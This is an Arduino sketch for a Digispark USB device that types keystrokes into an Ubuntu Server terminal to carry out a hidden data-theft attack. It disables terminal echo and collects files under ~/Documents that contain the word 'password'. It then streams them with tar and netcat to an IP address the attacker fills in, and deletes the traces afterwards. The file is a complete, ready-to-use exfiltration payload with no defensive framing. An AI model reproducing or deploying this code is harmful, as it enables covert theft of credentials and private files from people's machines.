#include "DigiKeyboard.h"

// Meant to run on Ubuntu Server

void setup() {
  // put your setup code here, to run once:

}

bool finished = false;
void loop() {
  // put your main code here, to run repeatedly:
  if (not finished) {
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.delay(250);
    
    // disable terminal echoing
    DigiKeyboard.print("stty -echo");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1000);

    // go to Documents
    DigiKeyboard.print("cd ~/Documents");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    
    // create a folder to contain the files we will be sending
    DigiKeyboard.print("mkdir files_to_send");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);

    // search through all files in the Documents folder and move any files containing
    //  the word 'password' in them to the files_to_send folder
    DigiKeyboard.print("grep -r -l password * | xargs -I % sh -c ''");
    DigiKeyboard.sendKeyStroke(42);
    DigiKeyboard.print("mv ");
    DigiKeyboard.sendKeyStroke(52, MOD_SHIFT_LEFT);
    DigiKeyboard.print("%");
    DigiKeyboard.sendKeyStroke(52, MOD_SHIFT_LEFT);
    DigiKeyboard.sendKeyStroke(52, MOD_SHIFT_LEFT);
    DigiKeyboard.sendKeyStroke(42);
    DigiKeyboard.print(" files_to_send'");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);

    // allow 75 seconds for the above command to run
    DigiKeyboard.delay(75000);
    
    // send the files_to_send folder to yourself
    //  ** replace the IP address below with your computer's IP address **
    DigiKeyboard.print("tar czp files_to_send | nc [receiving computer's IP address] 1234");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(3000);
    
    // quit the process if it hasn't quit by itself
    DigiKeyboard.sendKeyStroke(KEY_C, MOD_CONTROL_LEFT);
    DigiKeyboard.delay(500);
    
    // delete the files_to_send folder and all the files inside
    DigiKeyboard.print("rm -R files_to_send");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    
    // re-enable terminal echoing
    DigiKeyboard.print("stty echo");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    
    finished = true;
  }
}
